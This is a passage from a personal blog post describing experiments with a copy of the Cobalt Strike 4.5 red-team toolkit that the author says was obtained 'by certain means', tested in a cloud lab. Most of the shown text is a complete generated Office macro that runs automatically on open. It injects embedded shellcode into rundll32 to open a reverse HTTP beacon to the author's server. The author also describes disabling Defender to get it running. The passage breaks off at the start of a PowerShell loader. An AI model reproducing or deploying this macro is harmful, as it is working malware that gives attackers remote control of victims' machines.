</li>
<li>
<a href=https://swlacy.com/search title=Search accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://swlacy.com>Home</a>&nbsp;»&nbsp;<a href=https://swlacy.com/posts/>Posts</a></div>
<h1 class=post-title>
Playing With Cobalt Strike
</h1>
<div class=post-description>
Fun with Cobalt Strike v4.5
</div>
<div class=post-meta><span title="2022-02-11 00:00:00 +0000 UTC">February 11, 2022</span>&nbsp;·&nbsp;10 Minute Read&nbsp;·&nbsp;Sid Lacy
</div>
</header>
<figure class=entry-cover><a href=https://swlacy.com/media/playing-with-cobalt-strike-cover.jpg target=_blank rel="noopener noreferrer"><img loading=lazy src=https://swlacy.com/media/playing-with-cobalt-strike-cover.jpg alt="'Late Night Working', @josef_photography, (Unsplash, 2018)"></a>
<p>&lsquo;Late Night Working&rsquo;, @josef_photography, Unsplash</p>
</figure><div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#environment aria-label=Environment>Environment</a></li>
<li>
<a href=#microsoft-office-macro aria-label="Microsoft Office Macro">Microsoft Office Macro</a><ul>
<li>
<a href=#generation aria-label=Generation>Generation</a></li>
<li>
<a href=#execution aria-label=Execution>Execution</a></li></ul>
</li>
<li>
<a href=#powershell-script aria-label="PowerShell Script">PowerShell Script</a></li>
<li>
<a href=#special-delivery aria-label="Special Delivery">Special Delivery</a></li>
<li>
<a href=#more-stuff aria-label="More Stuff">More Stuff</a><ul>
<li>
<a href=#c-payload aria-label="C Payload">C Payload</a></li>
<li>
<a href=#foreign-connection aria-label="Foreign Connection?">Foreign Connection?</a></li>
<li>
<a href=#report-exporting aria-label="Report Exporting">Report Exporting</a></li>
<li>
<a href=#webpage-cloning aria-label="Webpage Cloning">Webpage Cloning</a></li></ul>
</li>
<li>
<a href=#wrapping-up aria-label="Wrapping Up">Wrapping Up</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><p>Ah, <a href=https://www.cobaltstrike.com/><em>Cobalt Strike</em></a>, HelpSystems' infamous (but legitimate) Red Teaming product coopted by attackers worldwide for malicious purposes. For those unfamiliar, Cobalt Strike is an adversarial toolkit. Its official capacity in the security industry is to simulate attacks for testing purposes. Of course, as is perhaps expected, given the prompt release of each new version to the Internet, those with less noble intentions also make use of the software.</p>
<p>By certain means, I have obtained a copy of Cobalt Strike version 4.5, released on December 14th, 2021. As this is a recent, licensed version, I was curious about which type of malicious operations I could successfully perform and the code behind them. Of course, as with all content posted on my website, education is the only objective. I carried out all testing in a cloud lab environment, and I suggest you do the same should you follow my processes here. Enjoy!</p>
<p><img loading=lazy src=/media/playing-with-cobalt-strike-1.png alt="Screenshot of Cobalt Strike 4.5 &amp;lsquo;About&amp;rsquo; Page">
</p>
<h2 id=environment>Environment<a hidden class=anchor aria-hidden=true href=#environment>#</a></h2>
<p>I prefer to host my testing machines off-site, especially when dealing with unverified software, such as my copy of Cobalt Strike. To facilitate that, Google&rsquo;s Cloud Compute Engine comes in handy. Unfortunately, due to licensing agreements with Microsoft, it is cheaper to run Windows hosts in Azure, so I have split my network like so:</p>
<pre tabindex=0><code class=language-none data-lang=none>Google Cloud VPC
└ Cobalt Strike (Debian 10)
Azure VPC
└ Victim Host (Windows 10)
</code></pre><h2 id=microsoft-office-macro>Microsoft Office Macro<a hidden class=anchor aria-hidden=true href=#microsoft-office-macro>#</a></h2>
<h3 id=generation>Generation<a hidden class=anchor aria-hidden=true href=#generation>#</a></h3>
<p>Microsoft recently announced that <a href=https://arstechnica.com/gadgets/2022/02/microsoft-will-block-downloaded-macros-in-office-versions-going-back-to-2013/>they will disable MS Office macros embedded in files downloaded from the Internet by default</a> — it&rsquo;s about time. Office macro attacks are so common that Cobalt Strike even has a dedicated button to allow for their simple generation.</p>
<p><img loading=lazy src=/media/playing-with-cobalt-strike-2.png alt="Screenshot of Cobalt Strike MS Office Macro Generator">
</p>
<p>Of course, I first have to set up a &ldquo;listener,&rdquo; something for my macro to contact. Luckily, HelpSystems provides their users (and abusers) with a set of <a href=https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm>well-detailed documentation</a>. I decided to use <code>windows/beacon_http/reverse_http</code> as my payload, configured as shown below.</p>
<p><img loading=lazy src=/media/playing-with-cobalt-strike-3.png alt="Screenshot of Listener for Macro">
</p>
<p>Upon generation of the macro, Cobalt Strike displayed macro deployment instructions. Red teaming is fool-proof these days!</p>
<p><img loading=lazy src=/media/playing-with-cobalt-strike-4.png alt="Screenshot of Macro Deployment Instructions">
</p>
<p>Here is the source code of the macro:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb><span style=color:#66d9ef>Private</span> Type PROCESS_INFORMATION
    hProcess <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    hThread <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    dwProcessId <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    dwThreadId <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
<span style=color:#66d9ef>End</span> Type

<span style=color:#66d9ef>Private</span> Type STARTUPINFO
    cb <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    lpReserved <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>
    lpDesktop <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>
    lpTitle <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>
    dwX <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    dwY <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    dwXSize <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    dwYSize <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    dwXCountChars <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    dwYCountChars <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    dwFillAttribute <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    dwFlags <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    wShowWindow <span style=color:#f92672>As</span> <span style=color:#66d9ef>Integer</span>
    cbReserved2 <span style=color:#f92672>As</span> <span style=color:#66d9ef>Integer</span>
    lpReserved2 <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    hStdInput <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    hStdOutput <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    hStdError <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
<span style=color:#66d9ef>End</span> Type

<span style=color:#75715e>#If VBA7 Then</span>
    <span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> PtrSafe <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>CreateStuff</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;kernel32&#34;</span> <span style=color:#66d9ef>Alias</span> <span style=color:#e6db74>&#34;CreateRemoteThread&#34;</span> (<span style=color:#66d9ef>ByVal</span> hProcess <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> lpThreadAttributes <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> dwStackSize <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> lpStartAddress <span style=color:#f92672>As</span> LongPtr, lpParameter <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> dwCreationFlags <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, lpThreadID <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>) <span style=color:#f92672>As</span> LongPtr
    <span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> PtrSafe <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>AllocStuff</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;kernel32&#34;</span> <span style=color:#66d9ef>Alias</span> <span style=color:#e6db74>&#34;VirtualAllocEx&#34;</span> (<span style=color:#66d9ef>ByVal</span> hProcess <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> lpAddr <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> lSize <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> flAllocationType <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> flProtect <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>) <span style=color:#f92672>As</span> LongPtr
    <span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> PtrSafe <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>WriteStuff</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;kernel32&#34;</span> <span style=color:#66d9ef>Alias</span> <span style=color:#e6db74>&#34;WriteProcessMemory&#34;</span> (<span style=color:#66d9ef>ByVal</span> hProcess <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> lDest <span style=color:#f92672>As</span> LongPtr, <span style=color:#66d9ef>ByRef</span> Source <span style=color:#f92672>As</span> Any, <span style=color:#66d9ef>ByVal</span> Length <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> LengthWrote <span style=color:#f92672>As</span> LongPtr) <span style=color:#f92672>As</span> LongPtr
    <span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> PtrSafe <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>RunStuff</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;kernel32&#34;</span> <span style=color:#66d9ef>Alias</span> <span style=color:#e6db74>&#34;CreateProcessA&#34;</span> (<span style=color:#66d9ef>ByVal</span> lpApplicationName <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>, <span style=color:#66d9ef>ByVal</span> lpCommandLine <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>, lpProcessAttributes <span style=color:#f92672>As</span> Any, lpThreadAttributes <span style=color:#f92672>As</span> Any, <span style=color:#66d9ef>ByVal</span> bInheritHandles <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> dwCreationFlags <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, lpEnvironment <span style=color:#f92672>As</span> Any, <span style=color:#66d9ef>ByVal</span> lpCurrentDirectory <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>, lpStartupInfo <span style=color:#f92672>As</span> STARTUPINFO, lpProcessInformation <span style=color:#f92672>As</span> PROCESS_INFORMATION) <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
<span style=color:#75715e>#Else</span>
    <span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>CreateStuff</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;kernel32&#34;</span> <span style=color:#66d9ef>Alias</span> <span style=color:#e6db74>&#34;CreateRemoteThread&#34;</span> (<span style=color:#66d9ef>ByVal</span> hProcess <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> lpThreadAttributes <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> dwStackSize <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> lpStartAddress <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, lpParameter <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> dwCreationFlags <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, lpThreadID <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>) <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    <span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>AllocStuff</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;kernel32&#34;</span> <span style=color:#66d9ef>Alias</span> <span style=color:#e6db74>&#34;VirtualAllocEx&#34;</span> (<span style=color:#66d9ef>ByVal</span> hProcess <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> lpAddr <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> lSize <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> flAllocationType <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> flProtect <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>) <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    <span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>WriteStuff</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;kernel32&#34;</span> <span style=color:#66d9ef>Alias</span> <span style=color:#e6db74>&#34;WriteProcessMemory&#34;</span> (<span style=color:#66d9ef>ByVal</span> hProcess <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> lDest <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByRef</span> Source <span style=color:#f92672>As</span> Any, <span style=color:#66d9ef>ByVal</span> Length <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> LengthWrote <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>) <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    <span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>RunStuff</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;kernel32&#34;</span> <span style=color:#66d9ef>Alias</span> <span style=color:#e6db74>&#34;CreateProcessA&#34;</span> (<span style=color:#66d9ef>ByVal</span> lpApplicationName <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>, <span style=color:#66d9ef>ByVal</span> lpCommandLine <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>, lpProcessAttributes <span style=color:#f92672>As</span> Any, lpThreadAttributes <span style=color:#f92672>As</span> Any, <span style=color:#66d9ef>ByVal</span> bInheritHandles <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> dwCreationFlags <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, lpEnvironment <span style=color:#f92672>As</span> Any, <span style=color:#66d9ef>ByVal</span> lpCurrentDriectory <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>, lpStartupInfo <span style=color:#f92672>As</span> STARTUPINFO, lpProcessInformation <span style=color:#f92672>As</span> PROCESS_INFORMATION) <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
<span style=color:#75715e>#End If</span>

<span style=color:#66d9ef>Sub</span> <span style=color:#a6e22e>Auto_Open</span>()
    <span style=color:#66d9ef>Dim</span> myByte <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, myArray <span style=color:#f92672>As</span> <span style=color:#66d9ef>Variant</span>, offset <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
    <span style=color:#66d9ef>Dim</span> pInfo <span style=color:#f92672>As</span> PROCESS_INFORMATION
    <span style=color:#66d9ef>Dim</span> sInfo <span style=color:#f92672>As</span> STARTUPINFO
    <span style=color:#66d9ef>Dim</span> sNull <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>
    <span style=color:#66d9ef>Dim</span> sProc <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>

<span style=color:#75715e>#If VBA7 Then</span>
    <span style=color:#66d9ef>Dim</span> rwxpage <span style=color:#f92672>As</span> LongPtr, res <span style=color:#f92672>As</span> LongPtr
<span style=color:#75715e>#Else</span>
    <span style=color:#66d9ef>Dim</span> rwxpage <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, res <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
<span style=color:#75715e>#End If</span>
    myArray <span style=color:#f92672>=</span> Array(<span style=color:#f92672>-</span>4,<span style=color:#f92672>-</span>24,<span style=color:#f92672>-</span>119,0,0,0,96,<span style=color:#f92672>-</span>119,<span style=color:#f92672>-</span>27,49,<span style=color:#f92672>-</span>46,100,<span style=color:#f92672>-</span>117,82,48,<span style=color:#f92672>-</span>117,82,12,<span style=color:#f92672>-</span>117,82,20,<span style=color:#f92672>-</span>117,114,40,15,<span style=color:#f92672>-</span>73,74,38,49,<span style=color:#f92672>-</span>1,49,<span style=color:#f92672>-</span>64,<span style=color:#f92672>-</span>84,60,97,124,2,44,32,<span style=color:#f92672>-</span>63,<span style=color:#f92672>-</span>49, _
13,1,<span style=color:#f92672>-</span>57,<span style=color:#f92672>-</span>30,<span style=color:#f92672>-</span>16,82,87,<span style=color:#f92672>-</span>117,82,16,<span style=color:#f92672>-</span>117,66,60,1,<span style=color:#f92672>-</span>48,<span style=color:#f92672>-</span>117,64,120,<span style=color:#f92672>-</span>123,<span style=color:#f92672>-</span>64,116,74,1,<span style=color:#f92672>-</span>48,80,<span style=color:#f92672>-</span>117,72,24,<span style=color:#f92672>-</span>117,88,32,1,<span style=color:#f92672>-</span>45,<span style=color:#f92672>-</span>29,60,73,<span style=color:#f92672>-</span>117,52,<span style=color:#f92672>-</span>117,1, _
<span style=color:#f92672>-</span>42,49,<span style=color:#f92672>-</span>1,49,<span style=color:#f92672>-</span>64,<span style=color:#f92672>-</span>84,<span style=color:#f92672>-</span>63,<span style=color:#f92672>-</span>49,13,1,<span style=color:#f92672>-</span>57,56,<span style=color:#f92672>-</span>32,117,<span style=color:#f92672>-</span>12,3,125,<span style=color:#f92672>-</span>8,59,125,36,117,<span style=color:#f92672>-</span>30,88,<span style=color:#f92672>-</span>117,88,36,1,<span style=color:#f92672>-</span>45,102,<span style=color:#f92672>-</span>117,12,75,<span style=color:#f92672>-</span>117,88,28,1,<span style=color:#f92672>-</span>45,<span style=color:#f92672>-</span>117,4, _
<span style=color:#f92672>-</span>117,1,<span style=color:#f92672>-</span>48,<span style=color:#f92672>-</span>119,68,36,36,91,91,97,89,90,81,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>32,88,95,90,<span style=color:#f92672>-</span>117,18,<span style=color:#f92672>-</span>21,<span style=color:#f92672>-</span>122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,<span style=color:#f92672>-</span>1, _
<span style=color:#f92672>-</span>43,49,<span style=color:#f92672>-</span>1,87,87,87,87,87,104,58,86,121,<span style=color:#f92672>-</span>89,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>43,<span style=color:#f92672>-</span>23,<span style=color:#f92672>-</span>124,0,0,0,91,49,<span style=color:#f92672>-</span>55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,<span style=color:#f92672>-</span>119,<span style=color:#f92672>-</span>97, _
<span style=color:#f92672>-</span>58,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>43,<span style=color:#f92672>-</span>21,112,91,49,<span style=color:#f92672>-</span>46,82,104,0,2,64,<span style=color:#f92672>-</span>124,82,82,82,83,82,80,104,<span style=color:#f92672>-</span>21,85,46,59,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>43,<span style=color:#f92672>-</span>119,<span style=color:#f92672>-</span>58,<span style=color:#f92672>-</span>125,<span style=color:#f92672>-</span>61,80,49,<span style=color:#f92672>-</span>1,87,87,106,<span style=color:#f92672>-</span>1,83,86, _
104,45,6,24,123,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>43,<span style=color:#f92672>-</span>123,<span style=color:#f92672>-</span>64,15,<span style=color:#f92672>-</span>124,<span style=color:#f92672>-</span>61,1,0,0,49,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>123,<span style=color:#f92672>-</span>10,116,4,<span style=color:#f92672>-</span>119,<span style=color:#f92672>-</span>7,<span style=color:#f92672>-</span>21,9,104,<span style=color:#f92672>-</span>86,<span style=color:#f92672>-</span>59,<span style=color:#f92672>-</span>30,93,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>43,<span style=color:#f92672>-</span>119,<span style=color:#f92672>-</span>63,104,69,33,94,49,<span style=color:#f92672>-</span>1, _
<span style=color:#f92672>-</span>43,49,<span style=color:#f92672>-</span>1,87,106,7,81,86,80,104,<span style=color:#f92672>-</span>73,87,<span style=color:#f92672>-</span>32,11,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>43,<span style=color:#f92672>-</span>65,0,47,0,0,57,<span style=color:#f92672>-</span>57,116,<span style=color:#f92672>-</span>73,49,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>23,<span style=color:#f92672>-</span>111,1,0,0,<span style=color:#f92672>-</span>23,<span style=color:#f92672>-</span>55,1,0,0,<span style=color:#f92672>-</span>24,<span style=color:#f92672>-</span>117,<span style=color:#f92672>-</span>1, _
<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>1,47,110,56,115,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _
83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116,47,53,46,48,59,32,76,66, _
66,82,79,87,83,69,82,41,13,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,104,<span style=color:#f92672>-</span>16,<span style=color:#f92672>-</span>75,<span style=color:#f92672>-</span>94,86,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>43,106,64,104,0,16,0,0, _
104,0,0,64,0,87,104,88,<span style=color:#f92672>-</span>92,83,<span style=color:#f92672>-</span>27,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>43,<span style=color:#f92672>-</span>109,<span style=color:#f92672>-</span>71,0,0,0,0,1,<span style=color:#f92672>-</span>39,81,83,<span style=color:#f92672>-</span>119,<span style=color:#f92672>-</span>25,87,104,0,32,0,0,83,86,104,18,<span style=color:#f92672>-</span>106,<span style=color:#f92672>-</span>119,<span style=color:#f92672>-</span>30,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>43, _
<span style=color:#f92672>-</span>123,<span style=color:#f92672>-</span>64,116,<span style=color:#f92672>-</span>58,<span style=color:#f92672>-</span>117,7,1,<span style=color:#f92672>-</span>61,<span style=color:#f92672>-</span>123,<span style=color:#f92672>-</span>64,117,<span style=color:#f92672>-</span>27,88,<span style=color:#f92672>-</span>61,<span style=color:#f92672>-</span>24,<span style=color:#f92672>-</span>87,<span style=color:#f92672>-</span>3,<span style=color:#f92672>-</span>1,<span style=color:#f92672>-</span>1,51,53,46,49,57,55,46,48,46,54,50,0,0,0,0,0)
    <span style=color:#66d9ef>If</span> Len(Environ(<span style=color:#e6db74>&#34;ProgramW6432&#34;</span>)) <span style=color:#f92672>&gt;</span> 0 <span style=color:#66d9ef>Then</span>
        sProc <span style=color:#f92672>=</span> Environ(<span style=color:#e6db74>&#34;windir&#34;</span>) <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;\\SysWOW64\\rundll32.exe&#34;</span>
    <span style=color:#66d9ef>Else</span>
        sProc <span style=color:#f92672>=</span> Environ(<span style=color:#e6db74>&#34;windir&#34;</span>) <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;\\System32\\rundll32.exe&#34;</span>
    <span style=color:#66d9ef>End</span> <span style=color:#66d9ef>If</span>

    res <span style=color:#f92672>=</span> RunStuff(sNull, sProc, <span style=color:#66d9ef>ByVal</span> 0<span style=color:#f92672>&amp;</span>, <span style=color:#66d9ef>ByVal</span> 0<span style=color:#f92672>&amp;</span>, <span style=color:#66d9ef>ByVal</span> 1<span style=color:#f92672>&amp;</span>, <span style=color:#66d9ef>ByVal</span> 4<span style=color:#f92672>&amp;</span>, <span style=color:#66d9ef>ByVal</span> 0<span style=color:#f92672>&amp;</span>, sNull, sInfo, pInfo)

    rwxpage <span style=color:#f92672>=</span> AllocStuff(pInfo.hProcess, 0, UBound(myArray), <span style=color:#f92672>&amp;</span>H1000, <span style=color:#f92672>&amp;</span>H40)
    <span style=color:#66d9ef>For</span> offset <span style=color:#f92672>=</span> LBound(myArray) <span style=color:#66d9ef>To</span> UBound(myArray)
        myByte <span style=color:#f92672>=</span> myArray(offset)
        res <span style=color:#f92672>=</span> WriteStuff(pInfo.hProcess, rwxpage <span style=color:#f92672>+</span> offset, myByte, 1, <span style=color:#66d9ef>ByVal</span> 0<span style=color:#f92672>&amp;</span>)
    <span style=color:#66d9ef>Next</span> offset
    res <span style=color:#f92672>=</span> CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
<span style=color:#66d9ef>End</span> <span style=color:#66d9ef>Sub</span>
<span style=color:#66d9ef>Sub</span> <span style=color:#a6e22e>AutoOpen</span>()
    Auto_Open
<span style=color:#66d9ef>End</span> <span style=color:#66d9ef>Sub</span>
<span style=color:#66d9ef>Sub</span> <span style=color:#a6e22e>Workbook_Open</span>()
    Auto_Open
<span style=color:#66d9ef>End</span> <span style=color:#66d9ef>Sub</span>
</code></pre></div><p><a href=https://www.virustotal.com/gui/file/b34401bb9834a33d7234a33fe7becf8002a557ed595b5664ba95cdfaa061f919/detection><strong>VirusTotal Report</strong></a></p>
<p>15 of 59 antivirus programs capable of processing macro-loaded Excel files reported malicious activity from the script above, including Microsoft Defender. Thus, I will likely have to turn off Microsoft Defender to run the macro. Avast&rsquo;s YARA Rule contributions specifically identified the maco as originating from Cobalt Strike.</p>
<p>I found the absence of my IP address within the code particularly interesting. I assume it can be reconstructed from the obfuscated code by using the values in <code>myArray</code> since a plain address would be easy to find and flag as malicious. I have censored my IP in screenshots thus far — if you can reconstruct it from that array, please <a href="mailto:contact@swlacy.com?subject=Playing%20With%20Cobalt%20Strike%20IP%20Address">send me an email</a>. I would love to know!</p>
<h3 id=execution>Execution<a hidden class=anchor aria-hidden=true href=#execution>#</a></h3>
<p>Here comes the fun part: let&rsquo;s test the functionality of the macro. The software specifications of the Windows victim can be seen in the screenshot below. <em>Sidenote: I find it disturbing that links to TikTok, mobile games, and Roblox are included in the Start Menu even in Azure images. What a nightmare.</em></p>
<p><img loading=lazy src=/media/playing-with-cobalt-strike-5.png alt="Screenshot of Cobalt Strike MS Office Macro Generator">
</p>
<p>Microsoft Defender immediately quarantined my Excel file upon saving it with the macro — annoying for my purposes, but a good thing nonetheless. However, many businesses do not remain vigilant when considering malware mitigation processes such as updating antivirus signatures, so the code generated by Cobalt Strike still poses a serious threat.</p>
<p><img loading=lazy src=/media/playing-with-cobalt-strike-6.png alt="Screenshot of Cobalt Strike MS Office Macro Generator">
</p>
<p>Disabling Defender allowed me to proceed, and&mldr; Exploitation was successful! From here, a variety of options were available, including the ability to upload files, attempt privilege escalation, and more. Fascinating stuff. Unfortunately, not all features worked as expected, but I am not sure if this is due to a misconfiguration on my part or whether some of the exploits Cobalt Strike attempted have been patched by Microsoft.</p>
<p><img loading=lazy src=/media/playing-with-cobalt-strike-7.png alt="Screenshot of Cobalt Strike MS Office Macro Generator">
</p>
<h2 id=powershell-script>PowerShell Script<a hidden class=anchor aria-hidden=true href=#powershell-script>#</a></h2>
<p>Using the same listener, I generated the following PowerShell script in Cobalt Strike.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>Set-StrictMode -Version 2

<span style=color:#66d9ef>function</span> func_get_proc_address {
        <span style=color:#66d9ef>Param</span> ($var_module, $var_procedure)
